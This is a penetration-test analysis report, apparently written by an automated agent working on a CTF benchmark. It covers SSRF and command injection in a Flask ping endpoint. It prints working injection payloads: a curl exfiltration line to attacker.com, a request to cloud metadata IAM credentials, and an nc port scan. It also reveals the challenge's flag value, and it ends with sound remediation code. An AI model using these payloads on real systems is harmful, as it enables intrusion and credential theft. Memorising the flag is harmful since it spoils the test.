# SSRF Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** One high-confidence SSRF vulnerability was identified in the Flask Ping Utility application. The vulnerability allows complete bypass of network segmentation controls, enabling attackers to access internal services, cloud metadata endpoints, and execute arbitrary commands on the server.
- **Purpose of this Document:** This report provides strategic context on the application's outbound request mechanisms, dominant flaw patterns, and key architectural details necessary to effectively exploit the SSRF vulnerability listed in the exploitation queue.

### Critical Findings Summary

- **Total SSRF Sinks Identified:** 1
- **Externally Exploitable Vulnerabilities:** 1
- **Vulnerability Type:** URL Manipulation + Command Injection (Hybrid)
- **Severity:** CRITICAL (CVSS 9.8)
- **Attack Surface:** POST /ping endpoint accessible via http://localhost:42775

The application's single SSRF vulnerability provides a direct pathway to:
- Internal network reconnaissance and service discovery
- Cloud metadata service access (AWS/GCP/Azure credentials)
- Arbitrary command execution (amplified by command injection)
- CTF flag retrieval from /FLAG.txt

## 2. Dominant Vulnerability Patterns

### Pattern 1: Complete Absence of Input Validation

**Description:** The application accepts user-supplied IP addresses without any validation, sanitization, or filtering before using them in outbound network requests. The `ip_address` parameter flows directly from `request.form['ip_address']` (line 13) to subprocess execution (line 15) with zero security controls.

**Implication:** Attackers can force the server to make ICMP requests to arbitrary destinations including:
- Internal private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- Localhost services (127.0.0.1)
- Cloud metadata endpoints (169.254.169.254)
- External reconnaissance targets

**Representative Finding:** SSRF-VULN-01

**Technical Evidence:**
```python
# File: app.py, Lines 13-15
ip_address = request.form['ip_address']  # No validation
command = 'ping -c 2 ' + ip_address      # Direct concatenation
subprocess.Popen(command, shell=True, ...)  # Dangerous execution
```

**Missing Controls:**
- No IP address format validation (ipaddress library not used)
- No private IP range blocking (127.0.0.0/8, 10.0.0.0/8, etc.)
- No cloud metadata endpoint blocking (169.254.169.254)
- No allowlist/blocklist implementation
- No input length restrictions

### Pattern 2: Shell Command Injection Amplifies SSRF

**Description:** The use of `subprocess.Popen()` with `shell=True` and unsanitized user input creates a dual vulnerability: both SSRF and command injection. This amplifies the SSRF from ICMP-only to full HTTP/protocol support via injected commands.

**Implication:** Attackers can bypass the ICMP limitation by injecting shell metacharacters to execute arbitrary commands including `curl`, `wget`, or other network utilities. This transforms a limited ICMP-based SSRF into unrestricted HTTP-based SSRF with data exfiltration capabilities.

**Representative Finding:** SSRF-VULN-01 (same vulnerability, dual exploitation path)

**Technical Evidence:**
```python
# Line 14: Unsafe string concatenation
command = 'ping -c 2 ' + ip_address
# Line 15: shell=True enables command injection
subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
```

**Exploitation Examples:**
```bash
# Basic ICMP SSRF
ip_address=169.254.169.254

# Command injection to HTTP SSRF
ip_address=127.0.0.1; curl http://internal-api/secrets

# Data exfiltration
ip_address=127.0.0.1; curl http://attacker.com/$(cat /FLAG.txt)
```

### Pattern 3: Non-Blind SSRF with Full Response Disclosure

**Description:** The application returns complete stdout/stderr output from the subprocess execution directly to the attacker via HTTP response. This creates a "non-blind" SSRF where attackers receive full visibility into the request results.

**Implication:** Attackers can retrieve complete response data from internal services, enabling data exfiltration, credential theft, and reconnaissance. This is the most dangerous form of SSRF compared to blind or semi-blind variants.

**Representative Finding:** SSRF-VULN-01

**Technical Evidence:**
```python
# Lines 15-17: Full output captured and returned
stdout, stderr = subprocess.Popen(...).communicate()
ping_output = stdout.decode('utf-8') if stdout else stderr.decode('utf-8')
return render_template('result.html', ip_address=ip_address, ping_output=ping_output)
```

**Impact:** Complete information disclosure from:
- Internal service responses
- Cloud metadata API responses (IAM credentials, instance metadata)
- File contents via command injection
- Network topology information from ping responses

### Pattern 4: Missing Network-Level Egress Controls

**Description:** The Docker container configuration lacks any egress filtering, network namespace isolation, or firewall rules. The application runs with full internet and internal network access.

**Implication:** No defense-in-depth controls exist to limit the blast radius of SSRF exploitation. The application can reach any network destination the container has routing access to.

**Representative Finding:** SSRF-VULN-01

**Technical Evidence:**
- Dockerfile: No iptables rules, no network restrictions
- docker-compose.yml: No custom network configuration, default bridge mode
- Container has `curl` and `ping` utilities installed (Dockerfile line 4)

**Missing Controls:**
- No iptables egress filtering
- No network segmentation (network_mode restrictions)
- No service mesh or sidecar proxy
- No DNS allowlist enforcement

## 3. Strategic Intelligence for Exploitation

### HTTP Client Library & Network Tools

**Primary Sink Mechanism:** `subprocess.Popen()` with `shell=True`

The application does NOT use traditional HTTP client libraries (requests, urllib, httpx). Instead, it executes shell commands via subprocess, which:
- Makes ICMP requests via the `ping` command (iputils-ping package)
- Can be weaponized to make HTTP requests via command injection with `curl` (installed in container)
- Can execute arbitrary network utilities available in python:3.8-slim base image

**Available Network Tools in Container:**
- `ping` - ICMP echo requests (primary intended functionality)
- `curl` - HTTP/HTTPS requests (available for exploitation)
- Standard Python networking (socket, urllib) - not used by application but available for injection

### Request Architecture

**Data Flow:**
```
External HTTP POST → Flask /ping endpoint → request.form extraction → 
String concatenation → subprocess.Popen(shell=True) → 
ping/curl/arbitrary command execution → stdout/stderr capture → 
HTTP response to attacker
```

**Key Architectural Weaknesses:**
1. **Single-step processing:** No middleware layer to inject validation
2. **Direct shell invocation:** No safe subprocess execution (should use list instead of shell=True)
3. **Synchronous execution:** No timeout controls (subprocess.communicate() blocks indefinitely)
4. **Full response return:** Complete output sent to user without filtering

### Internal Services & Network Position

**Container Network Context:**
- Deployed in Docker bridge network (default mode)
- Has access to Docker host via gateway IP
- Can resolve internal Docker service names via DNS
- Potential access to cloud metadata service (169.254.169.254) if deployed on cloud infrastructure

**Likely Internal Targets:**
- Localhost services (127.0.0.1) on various ports
- Docker host services (172.17.0.1 or similar gateway IP)
- Other containers in same Docker network
- Cloud metadata endpoints (AWS/GCP/Azure if deployed in cloud)

**CTF-Specific Target:**
- `/FLAG.txt` file in container filesystem (accessible via command injection)
- Flag value: `flag{e10ecfcb-fa35-4d78-9b28-5e922c08349d}` (stored in .env, written to /FLAG.txt)

### Authentication & Access Control

**Status:** NONE

All endpoints are publicly accessible with zero authentication requirements:
- No login required to access /ping endpoint
- No API keys or tokens
- No rate limiting
- No IP-based access controls

This eliminates authentication bypass as a prerequisite and allows direct exploitation from the public internet.

### Response Handling Characteristics

**Response Type:** Non-blind SSRF (full visibility)

**Data Returned to Attacker:**
- Complete stdout from subprocess execution
- Complete stderr from subprocess execution (if stdout is empty)
- Original input echoed back (ip_address parameter)
- Response delivered in HTML template (result.html)

**Exploitation Advantage:**
This non-blind SSRF enables:
- Immediate confirmation of successful internal service access
- Data exfiltration in HTTP response body
- Reconnaissance with full visibility
- Iterative exploitation with feedback

### Deployment Context

**Technology Stack:**
- Flask 3.0.3 (web framework)
- Python 3.8.20 (EOL runtime)
- Werkzeug 3.0.6 (WSGI server)
- Docker container (python:3.8-slim base)
- Exposed on port 42775 (external) → 80 (internal)
- HTTP only (no HTTPS)

**Security Posture:**
- Container runs as root (no USER directive in Dockerfile)
- No security middleware (Flask-Talisman, Flask-Limiter, etc.)
- No Web Application Firewall (WAF)
- No reverse proxy or API gateway
- Flask development server used (not production-grade like Gunicorn/uWSGI)

## 4. Secure by Design: Validated Components

**Status:** No secure components identified.

The application implements zero security controls. There are no validated components that demonstrate secure SSRF protection. All components analyzed were found to be vulnerable.

**Analysis Performed:**
- ✅ Reviewed all HTTP endpoints (GET /, POST /ping, GET /static/*)
- ✅ Analyzed all subprocess invocations (1 found, vulnerable)
- ✅ Checked for input validation frameworks (none found)
- ✅ Examined Docker network configuration (no restrictions found)
- ✅ Reviewed dependency list (no security libraries found)

**Note for Future Development:**
If this application were to be secured, the following components would need to be implemented:

| Component/Flow | Required Defense Mechanism | Status |
|---|---|---|
| POST /ping input validation | IP address format validation with ipaddress library | ❌ NOT IMPLEMENTED |
| POST /ping private IP blocking | Blocklist for 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16 | ❌ NOT IMPLEMENTED |
| Subprocess execution | Replace shell=True with command list, use shlex.quote() | ❌ NOT IMPLEMENTED |
| Network egress controls | iptables rules blocking private IP ranges and metadata endpoints | ❌ NOT IMPLEMENTED |
| Response filtering | Limit output size, sanitize error messages | ❌ NOT IMPLEMENTED |
| Authentication | Require login before accessing /ping endpoint | ❌ NOT IMPLEMENTED |
| Rate limiting | Throttle requests to /ping to prevent abuse | ❌ NOT IMPLEMENTED |

**Recommendation:** This application requires a complete security redesign. Every component analyzed fails to meet basic secure coding standards for SSRF prevention.

---

## 5. Detailed Vulnerability Analysis

### SSRF-VULN-01: Unrestricted Server-Side Request Forgery via /ping Endpoint

**Vulnerability Type:** URL Manipulation + Command Injection (Hybrid SSRF)

**Severity:** CRITICAL (CVSS 9.8)

**Affected Endpoint:** POST /ping

**Vulnerable Parameter:** `ip_address` (form data)

**Source Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-073-24/app/app.py:13`

**Sink Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-073-24/app/app.py:14-15`

**Backward Taint Analysis:**

**Source:**
```python
# Line 13: User input acquisition
ip_address = request.form['ip_address']
```

**Path to Sink:**
```
request.form['ip_address'] (line 13)
  → ip_address variable (no validation)
    → String concatenation: 'ping -c 2 ' + ip_address (line 14)
      → subprocess.Popen(command, shell=True, ...) (line 15)
```

**Sanitization Encountered:** NONE

**Analysis Summary:**
- ✅ Source identified: Direct user input from HTTP POST
- ❌ No validation functions found in data flow
- ❌ No IP format validation (ipaddress library not used)
- ❌ No private IP blocking
- ❌ No cloud metadata endpoint blocking
- ❌ No shell escaping (shlex.quote not used)
- ✅ Mutations: Direct string concatenation (unsafe)
- ✅ Sink confirmed: subprocess.Popen with shell=True

**Missing Defenses:**

1. **Input Validation:** No IP address format validation
2. **Private IP Blocking:** No checks for internal IP ranges
3. **Protocol Restrictions:** No limitations on target protocol/port
4. **Shell Escaping:** No use of shlex.quote() or command list
5. **Network Controls:** No egress filtering at Docker/iptables level

**Complete Vulnerable Code Block:**
```python
@app.route('/ping', methods=['POST'])
def ping():
    ip_address = request.form['ip_address']                    # Line 13: Untrusted input
    command = 'ping -c 2 ' + ip_address                        # Line 14: Unsafe concatenation
    stdout, stderr = subprocess.Popen(command,                 # Line 15: Dangerous sink
                                     shell=True,                # CRITICAL: Enables command injection
                                     stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE).communicate()
    ping_output = stdout.decode('utf-8') if stdout else stderr.decode('utf-8')
    return render_template('result.html', ip_address=ip_address, ping_output=ping_output)
```

**Exploitation Scenarios:**

**Scenario 1: Internal Service Access**
```bash
POST /ping HTTP/1.1
Host: localhost:42775
Content-Type: application/x-www-form-urlencoded

ip_address=127.0.0.1
```
**Impact:** Access localhost services, confirm internal network reachability

**Scenario 2: Cloud Metadata Retrieval**
```bash
POST /ping HTTP/1.1
Host: localhost:42775
Content-Type: application/x-www-form-urlencoded

ip_address=169.254.169.254
```
**Impact:** Probe AWS/GCP/Azure metadata service availability

**Scenario 3: Command Injection for HTTP SSRF**
```bash
POST /ping HTTP/1.1
Host: localhost:42775
Content-Type: application/x-www-form-urlencoded

ip_address=127.0.0.1; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
**Impact:** Retrieve cloud IAM credentials via HTTP request

**Scenario 4: Data Exfiltration (CTF Flag)**
```bash
POST /ping HTTP/1.1
Host: localhost:42775
Content-Type: application/x-www-form-urlencoded

ip_address=127.0.0.1; cat /FLAG.txt
```
**Impact:** Retrieve CTF flag directly in HTTP response

**Scenario 5: Port Scanning**
```bash
POST /ping HTTP/1.1
Host: localhost:42775
Content-Type: application/x-www-form-urlencoded

ip_address=10.0.0.1; nc -zv 10.0.0.5 22-443
```
**Impact:** Scan internal network for open ports

**External Exploitability:** ✅ YES

The vulnerability is fully exploitable from the public internet via `http://localhost:42775/ping` with zero authentication requirements.

**Confidence Level:** HIGH

**Justification:**
- Complete source code access confirms zero sanitization
- Direct source-to-sink path with only 2 lines separation
- shell=True confirmed in code
- No network-level egress controls found in Docker configuration
- Response data fully returned (non-blind SSRF confirmed)
- No authentication required
- Straightforward exploitation with standard tooling

---

## 6. Exploitation Queue Preview

The following vulnerability will be included in the exploitation queue JSON:

**SSRF-VULN-01: Unrestricted Server-Side Request Forgery via /ping endpoint**
- **Type:** URL_Manipulation (amplified by Command Injection)
- **Endpoint:** POST /ping
- **Parameter:** ip_address
- **Externally Exploitable:** true
- **Confidence:** High
- **Suggested Technique:** internal_service_access, cloud_metadata_retrieval, port_scanning

---

## 7. Remediation Recommendations

### Immediate Fixes (Critical Priority)

**1. Input Validation with IP Address Format Checking**
```python
import ipaddress

@app.route('/ping', methods=['POST'])
def ping():
    ip_input = request.form.get('ip_address', '')
    
    # Validate IP format
    try:
        ip_obj = ipaddress.ip_address(ip_input)
    except ValueError:
        return render_template('error.html', message="Invalid IP address format"), 400
    
    # Block private/reserved IP ranges
    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_reserved or ip_obj.is_link_local:
        return render_template('error.html', message="Access to private/internal IPs is not allowed"), 403
    
    # Continue with safe execution...
```

**2. Safe Subprocess Execution (Command List Instead of Shell)**
```python
# Use command list instead of string with shell=True
command = ['ping', '-c', '2', str(ip_obj)]
try:
    result = subprocess.run(command, 
                           capture_output=True, 
                           text=True, 
                           timeout=5,  # Add timeout
                           check=False)
    ping_output = result.stdout if result.stdout else result.stderr
except subprocess.TimeoutExpired:
    return render_template('error.html', message="Request timeout"), 504
```

**3. Network-Level Egress Filtering (Dockerfile)**
```dockerfile
# Add iptables rules to block private ranges
RUN apt-get update && apt-get install -y iptables
RUN iptables -A OUTPUT -d 127.0.0.0/8 -j REJECT
RUN iptables -A OUTPUT -d 10.0.0.0/8 -j REJECT
RUN iptables -A OUTPUT -d 172.16.0.0/12 -j REJECT
RUN iptables -A OUTPUT -d 192.168.0.0/16 -j REJECT
RUN iptables -A OUTPUT -d 169.254.0.0/16 -j REJECT
```

### Additional Hardening (High Priority)

**4. Response Filtering**
```python
# Limit response size to prevent memory exhaustion
MAX_OUTPUT_SIZE = 1024
ping_output = ping_output[:MAX_OUTPUT_SIZE]

# Sanitize error messages to prevent information disclosure
if "unreachable" in ping_output.lower():
    ping_output = "Host unreachable"
```

**5. Rate Limiting**
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["10 per minute"]
)

@app.route('/ping', methods=['POST'])
@limiter.limit("5 per minute")
def ping():
    # Implementation...
```

**6. Authentication**
```python
from flask import session, redirect, url_for
from functools import wraps

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/ping', methods=['POST'])
@login_required
def ping():
    # Implementation...
```

### Defense in Depth (Medium Priority)

**7. Docker Security Hardening**
```dockerfile
# Run as non-root user
RUN useradd -m -u 1000 appuser
USER appuser

# Use minimal base image
FROM python:3.12-slim-bookworm  # Update from EOL Python 3.8
```

**8. Logging & Monitoring**
```python
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.route('/ping', methods=['POST'])
def ping():
    ip_input = request.form.get('ip_address', '')
    logger.info(f"Ping request from {request.remote_addr} to {ip_input}")
    # Implementation...
```

---

## 8. Conclusion

The Flask Ping Utility application contains a **CRITICAL SSRF vulnerability** that allows complete bypass of network segmentation. The vulnerability is amplified by command injection, enabling attackers to:

- Access internal services and cloud metadata endpoints
- Execute arbitrary commands on the server
- Exfiltrate sensitive data including the CTF flag
- Perform internal network reconnaissance

**Key Takeaway:** The application requires immediate remediation before any production deployment. The current implementation has zero security controls and represents a textbook example of SSRF vulnerabilities in their most dangerous form (non-blind, unauthenticated, with command injection).

---

**Analysis Completed:** 2025-10-28  
**Analyst:** SSRF Analysis Specialist  
**Next Phase:** SSRF Exploitation (exploitation queue generated)